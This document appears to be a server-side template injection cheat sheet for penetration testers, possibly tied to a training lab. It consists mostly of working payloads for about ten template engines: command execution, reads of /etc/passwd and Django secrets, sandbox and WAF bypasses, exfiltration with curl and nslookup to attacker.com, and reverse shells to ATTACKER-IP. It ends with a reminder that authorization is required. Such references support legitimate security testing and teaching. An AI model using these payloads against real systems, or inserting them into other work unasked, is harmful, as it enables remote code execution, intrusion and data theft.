# Server-Side Template Injection (SSTI) - Cheat Sheet

**Comprehensive payload and technique reference for all major template engines**

---

## Detection Payloads

### Universal Fuzzing String
```
${{<%[%'"}}%\
```
**Purpose:** Trigger errors revealing template engine name

### Mathematical Expression Tests

```ruby
<%= 7*7 %>     # ERB (Ruby) - Returns 49
<%= 7+'7' %>   # ERB - Returns "77"
```

```python
{{7*7}}        # Jinja2/Tornado (Python) - Returns 49
{{7*'7'}}      # Jinja2 - Returns "7777777"
```

```freemarker
${7*7}         # Freemarker (Java) - Returns 49
${7+7}         # Freemarker - Returns 14
```

```handlebars
{{7*7}}        # Handlebars (Node.js) - Returns "7*7" (literal)
```

```django
{{7*7}}        # Django (Python) - Returns "7*7" (literal)
```

### Context-Breaking Tests

```
# Break out of double quotes
"}{{7*7}}{{

# Break out of single quotes
'}{{7*7}}{{

# Break out of existing expression
}}{{7*7}}{{

# Multiple techniques combined
"}}'}}{{7*7}}
```

---

## Template Engine Payloads

## ERB (Ruby)

### Basic Syntax
```erb
<%= expression %>    # Execute and output
<% code %>          # Execute without output
<%# comment %>      # Comment
```

### Command Execution
```erb
<%= system("whoami") %>
<%= `whoami` %>
<%= exec("whoami") %>
<%= IO.popen("whoami").read %>
<%= %x(whoami) %>
<%= open("|whoami").read %>
```

### File Operations
```erb
<%= File.read('/etc/passwd') %>
<%= IO.read('/etc/passwd') %>
<%= File.open('/etc/passwd').read %>
<%= File.open('/etc/passwd', 'r') { |f| f.read } %>
```

### Directory Listing
```erb
<%= Dir.entries('/') %>
<%= Dir.glob('/*') %>
<%= `ls -la /` %>
```

### Environment Variables
```erb
<%= ENV %>
<%= ENV['PATH'] %>
<%= ENV.keys %>
```

### Reverse Shell
```erb
<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'") %>
<%= `nc ATTACKER-IP PORT -e /bin/bash` %>
```

---

## Tornado (Python)

### Basic Syntax
```python
{{ expression }}     # Output
{% code %}          # Execute
{# comment #}       # Comment
```

### Command Execution
```python
{% import os %}{{os.system('whoami')}}
{% import subprocess %}{{subprocess.check_output('whoami')}}
{% import subprocess %}{{subprocess.call(['whoami'])}}
{% import os %}{{os.popen('whoami').read()}}
```

### Breaking Out of Context
```python
# If inside: {{user.name}}
user.name}}{% import os %}{{os.system('whoami')

# If inside: {{"text" + user.name}}
user.name}}{% import os %}{{os.system('whoami')
```

### File Operations
```python
{% import os %}{{open('/etc/passwd').read()}}
{% import io %}{{io.open('/etc/passwd','r').read()}}
```

### Module Imports
```python
{% import os %}
{% import sys %}
{% import subprocess %}
{% import socket %}
{% import time %}
```

### Reverse Shell
```python
{% import os %}{{os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'")}}
```

---

## Jinja2 (Python)

### Basic Syntax
```python
{{ expression }}     # Output
{% code %}          # Execute
{# comment #}       # Comment
{{ var|filter }}    # Filter application
```

### Configuration Dumping
```python
{{ config }}
{{ config.items() }}
{{ config.keys() }}
{{ config.values() }}
```

### Object Introspection
```python
{{ ''.__class__ }}
{{ [].__class__ }}
{{ {}.__class__ }}
{{ ''.__class__.__mro__ }}
{{ [].__class__.__bases__ }}
```

### Command Execution via Object Chain
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

### Built-in Access
```python
{{ self.__init__.__globals__.__builtins__ }}
{{ self.__init__.__globals__.__builtins__.__import__('os').system('whoami') }}
{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate() }}
```

### Request Object Access
```python
{{ request }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

### Cycler Object Exploitation
```python
{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
{{ joiner.__init__.__globals__.os.popen('whoami').read() }}
{{ namespace.__init__.__globals__.os.popen('whoami').read() }}
```

### File Read
```python
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.__class__.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
```

---

## Freemarker (Java)

### Basic Syntax
```freemarker
${expression}           # Output
<#assign var=value>    # Variable assignment
<#if test>...</#if>    # Conditional
<#list seq as item>    # Iteration
```

### Execute Class (Unsandboxed)
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
${ex("cat /etc/passwd")}
${ex("ls -la /")}
```

### ObjectConstructor Class
```freemarker
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
${oc("java.lang.Runtime").getRuntime().exec("whoami")}
```

### Reflection Chain (Sandboxed Bypass)
```freemarker
${object.getClass()}
${object.getClass().getClassLoader()}
${object.getClass().getProtectionDomain()}
${object.getClass().getProtectionDomain().getCodeSource()}
${object.getClass().getProtectionDomain().getCodeSource().getLocation()}
```

### File Read via Reflection
```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

### File Read (Alternative)
```freemarker
${product.getClass().getClassLoader().getResource('/etc/passwd').getContent()}
```

### Class Enumeration
```freemarker
${object.getClass().getDeclaredMethods()}
${object.getClass().getDeclaredFields()}
${object.getClass().getConstructors()}
```

---

## Handlebars (Node.js)

### Basic Syntax
```handlebars
{{ expression }}              # Output
{{#helper}}...{{/helper}}    # Block helper
{{! comment }}               # Comment
```

### RCE via require() - Full Exploit
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('COMMAND');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Alternative Handlebars RCE
```handlebars
{{#with "constructor" as |String|}}
  {{#with (String.sub "0" 0)}}
    {{#with (Function "return require('child_process').exec('whoami');")}}
      {{.}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Handlebars Helpers Abuse
```handlebars
{{#each (lookup this "constructor")}}
  {{.}}
{{/each}}
```

---

## Django (Python)

### Basic Syntax
```django
{{ variable }}        # Output
{% tag %}            # Execute tag
{{ var|filter }}     # Apply filter
{# comment #}        # Comment
```

### Debug Information
```django
{% debug %}
```

### Settings Access
```django
{{ settings.SECRET_KEY }}
{{ settings.DATABASES }}
{{ settings.DEBUG }}
{{ settings.INSTALLED_APPS }}
{{ settings.MIDDLEWARE }}
```

### Request Object
```django
{{ request }}
{{ request.META }}
{{ request.GET }}
{{ request.POST }}
{{ request.COOKIES }}
{{ request.session }}
{{ request.user }}
{{ request.headers }}
```

### User Object
```django
{{ user }}
{{ user.username }}
{{ user.email }}
{{ user.is_superuser }}
{{ user.groups }}
```

### Template Variables Enumeration
```django
{% for key, value in request.META.items %}
  {{ key }}: {{ value }}
{% endfor %}
```

### Load Module
```django
{% load static %}
{% load admin_urls %}
```

---

## Twig (PHP)

### Basic Syntax
```twig
{{ expression }}     # Output
{% code %}          # Execute
{# comment #}       # Comment
{{ var|filter }}    # Filter
```

### Command Execution
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("whoami")}}
```

### File Read
```twig
{{ include("/etc/passwd") }}
{{ source("/etc/passwd") }}
```

### Function Call
```twig
{{["id"]|filter("system")}}
{{["cat /etc/passwd"]|filter("system")}}
{{["id"]|map("system")|join}}
```

### Environment Access
```twig
{{_self.env}}
{{dump(_self)}}
{{dump(_context)}}
```

---

## Pug/Jade (Node.js)

### Basic Syntax
```pug
#{expression}    # Output
- code          # Execute
// comment      # Comment
```

### Command Execution
```pug
#{function(){return require('child_process').execSync('whoami').toString()}()}
- var x = require('child_process').execSync('whoami').toString()
#{x}
```

### File Read
```pug
#{require('fs').readFileSync('/etc/passwd').toString()}
```

---

## Velocity (Java)

### Basic Syntax
```velocity
$variable         # Output
#set($var = "value")  # Variable
#if($condition)   # Conditional
## comment        # Comment
```

### Command Execution
```velocity
#set($runtime = $class.forName("java.lang.Runtime"))
#set($method = $runtime.getDeclaredMethod("getRuntime"))
#set($process = $method.invoke(null))
#set($exec = $process.exec("whoami"))
```

### Class Loader Access
```velocity
$class.getClassLoader()
$class.getClassLoader().loadClass("java.lang.Runtime")
```

---

## Smarty (PHP)

### Basic Syntax
```smarty
{$variable}      # Output
{php}code{/php}  # PHP code (deprecated)
{* comment *}    # Comment
```

### Command Execution (Smarty 2)
```smarty
{php}system('whoami');{/php}
{php}echo `whoami`;{/php}
```

### Command Execution (Smarty 3)
```smarty
{system('whoami')}
{eval('system("whoami");')}
```

### File Read
```smarty
{file_get_contents('/etc/passwd')}
```

---

## Mako (Python)

### Basic Syntax
```mako
${expression}    # Output
<% code %>       # Execute
## comment       # Comment
```

### Command Execution
```mako
${__import__('os').system('whoami')}
<% import os; os.system('whoami') %>
```

### File Read
```mako
${open('/etc/passwd').read()}
```

---

## Common Attack Patterns

### Breaking Out of Contexts

**Double Quote String:**
```
"}{{7*7}}{{
"}}<%= 7*7 %>{{"
"}}${7*7}${{
```

**Single Quote String:**
```
'}{{7*7}}{{
'}}<%= 7*7 %>{{'
'}}${7*7}${{
```

**Expression Context:**
```
}}{{7*7}}{{
%><%= 7*7 %><%
}${7*7}${
```

**HTML Attribute:**
```
" onload="alert(1)">{{7*7}}
' onload='alert(1)'>{{7*7}}
```

---

## Blind SSTI Detection

### DNS Exfiltration

**ERB:**
```erb
<%= `nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN` %>
<%= `nslookup attacker.com` %>
```

**Python:**
```python
{% import os %}{{os.system('nslookup BURP-COLLABORATOR-SUBDOMAIN')}}
```

**Freemarker:**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("nslookup BURP-COLLABORATOR-SUBDOMAIN")}
```

### HTTP Exfiltration

**ERB:**
```erb
<%= `curl http://BURP-COLLABORATOR-SUBDOMAIN` %>
<%= `wget http://BURP-COLLABORATOR-SUBDOMAIN` %>
```

**Python:**
```python
{% import urllib %}{{urllib.request.urlopen('http://BURP-COLLABORATOR-SUBDOMAIN')}}
```

### Time-Based Detection

**ERB:**
```erb
<%= sleep(10) %>
```

**Python:**
```python
{% import time %}{{time.sleep(10)}}
```

**Java:**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("sleep 10")}
```

---

## Data Exfiltration

### ERB (Ruby)
```erb
<%= `curl http://attacker.com/?data=$(cat /etc/passwd | base64)` %>
<%= `nslookup $(whoami).attacker.com` %>
```

### Python
```python
{% import os %}{{os.system('curl http://attacker.com/?data=$(cat /etc/passwd | base64)')}}
```

### Freemarker (Java)
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("curl http://attacker.com/?data=$(cat /etc/passwd | base64)")}
```

---

## Reverse Shells

### ERB (Ruby)
```erb
<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'") %>
<%= `nc ATTACKER-IP PORT -e /bin/bash` %>
<%= `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("ATTACKER-IP",PORT))'` %>
```

### Python
```python
{% import os %}{{os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'")}}
{% import os %}{{os.system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER-IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'")}}
```

### Node.js (Handlebars)
```handlebars
{{#with "s" as |string|}}...require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1"')...{{/with}}
```

---

## Sandbox Bypass Techniques

### Java Reflection (Freemarker)
```freemarker
${object.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

### Python MRO Traversal (Jinja2)
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

### Class Loader Manipulation (Java)
```freemarker
${object.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null)}
```

### Built-in Access (Python)
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
```

---

## WAF Bypass Techniques

### Encoding
```
# URL encoding
%3C%25%3D%20system("whoami")%20%25%3E

# Double encoding
%253C%2525%253D%2520system("whoami")%2520%2525%253E

# Unicode
\u003c%= system("whoami") %\u003e
```

### Case Variation
```
${SyStEm("whoami")}
${SYSTEM("whoami")}
```

### String Concatenation
```ruby
<%= "sys"+"tem"("whoami") %>
<%= ["sys","tem"].join.to_sym.("whoami") %>
```

### Alternative Syntax
```python
# Instead of os.system
{% import subprocess %}{{subprocess.call(['whoami'])}}
{% import subprocess %}{{subprocess.check_output('whoami')}}
{% import os %}{{os.popen('whoami').read()}}
```

---

## Enumeration Payloads

### List Available Objects (Django)
```django
{% debug %}
{{ request }}
{{ settings }}
```

### List Methods (Freemarker)
```freemarker
${object.getClass().getDeclaredMethods()}
${object.getClass().getMethods()}
```

### List Attributes (Python)
```python
{{ object.__dict__ }}
{{ dir(object) }}
```

### Environment Variables
```erb
<%= ENV %>
```

```python
{% import os %}{{os.environ}}
```

---

## Filter/Function Reference

### Jinja2 Filters
```python
{{ text|upper }}           # Uppercase
{{ text|lower }}           # Lowercase
{{ text|replace("a","b") }} # Replace
{{ list|join(",") }}       # Join
{{ text|escape }}          # HTML escape
{{ text|safe }}            # Mark safe (no escape)
{{ text|length }}          # Length
```

### Django Filters
```django
{{ text|upper }}
{{ text|lower }}
{{ text|title }}
{{ list|join:", " }}
{{ date|date:"Y-m-d" }}
{{ text|truncatewords:10 }}
```

### Freemarker Built-ins
```freemarker
${"text"?upper_case}
${"text"?lower_case}
${"text"?length}
${"ClassName"?new()}    # Dangerous!
${sequence?size}
```

---

## Common Mistakes and Fixes

### Mistake: Not URL Encoding
```
❌ /?param=<%= 7*7 %>
✓ /?param=%3C%25%3D+7*7+%25%3E
```

### Mistake: Wrong Engine Syntax
```
❌ Django: {{os.system('whoami')}}
✓ Django: {{settings.SECRET_KEY}}
```

### Mistake: Not Breaking Out
```
❌ Template: {{user.name}}
   Payload: system("whoami")
   Result: {{user.system("whoami")}}

✓ Template: {{user.name}}
   Payload: name}}{{7*7}}
   Result: {{user.name}}{{7*7}}
```

### Mistake: Missing Parameters
```
❌ user.setAvatar('/etc/passwd')
✓ user.setAvatar('/etc/passwd','image/jpg')
```

---

## Conversion Utilities

### ASCII Decimal to Text (Lab 7)
```python
# Python
ascii_values = [109, 121, 112, 97, 115, 115]
text = ''.join(chr(val) for val in ascii_values)
print(text)  # mypass
```

```bash
# Bash
echo "109 121 112 97 115 115" | awk '{for(i=1;i<=NF;i++)printf("%c",$i)}'
```

```javascript
// JavaScript
const ascii = [109, 121, 112, 97, 115, 115];
const text = String.fromCharCode(...ascii);
console.log(text);  // mypass
```

### Base64 Encoding
```ruby
<%= `echo 'data' | base64` %>
```

```python
{% import base64 %}{{base64.b64encode(b'data')}}
```

---

## Testing Checklist

- [ ] Test GET parameters
- [ ] Test POST parameters
- [ ] Test HTTP headers (User-Agent, Referer, etc.)
- [ ] Test file upload content
- [ ] Test JSON/XML input
- [ ] Test cookie values
- [ ] Test WebSocket messages
- [ ] Check for blind SSTI with callbacks
- [ ] Test time-based detection
- [ ] Try multiple template engines
- [ ] Test breaking out of contexts
- [ ] Enumerate available objects
- [ ] Read documentation for custom engines
- [ ] Chain multiple vulnerabilities

---

## Burp Suite Integration

### Intruder Payload List
```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
${{7*7}}
@{7*7}
#{7*7}
*{7*7}
${{<%[%'"}}%\
```

### Collaborator Payloads
```erb
<%= `nslookup §COLLABORATOR§` %>
```

```python
{% import os %}{{os.system('nslookup §COLLABORATOR§')}}
```

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup §COLLABORATOR§")}
```

---

## Real-World Examples

### Email Template SSTI
```
Subject: {{user.name}}
Body: Dear {{user.name}}, ...

Exploit: name}}{% import os %}{{os.system('whoami')
```

### PDF Generator SSTI
```
Invoice for: {{company_name}}

Exploit: company_name}}<%= system("whoami") %>
```

### CMS Template SSTI
```html
<div class="{{theme}}">Content</div>

Exploit: theme}}<%= `whoami` %>{{
```

---

## Tool Recommendations

**Detection:**
- Burp Scanner
- OWASP ZAP
- tplmap (https://github.com/epinna/tplmap)

**Exploitation:**
- Burp Repeater
- curl with custom payloads
- Custom Python/Ruby scripts

**Blind Detection:**
- Burp Collaborator
- Interactsh (https://github.com/projectdiscovery/interactsh)
- RequestBin

---

## Quick Reference Table

| Engine | Language | Output | Execute | RCE Function |
|--------|----------|--------|---------|--------------|
| ERB | Ruby | `<%= %>` | `<% %>` | `system()` |
| Tornado | Python | `{{}}` | `{% %}` | `os.system()` |
| Jinja2 | Python | `{{}}` | `{% %}` | `os.system()` |
| Django | Python | `{{}}` | `{% %}` | N/A (limited) |
| Freemarker | Java | `${}` | `<#>` | `Execute` class |
| Handlebars | Node.js | `{{}}` | `{{#}}` | `require()` |
| Twig | PHP | `{{}}` | `{% %}` | `system()` |
| Smarty | PHP | `{}` | `{php}` | `system()` |
| Velocity | Java | `$` | `#` | `Runtime.exec()` |

---

**Remember:** Always obtain proper authorization before testing for SSTI vulnerabilities. Unauthorized testing is illegal.
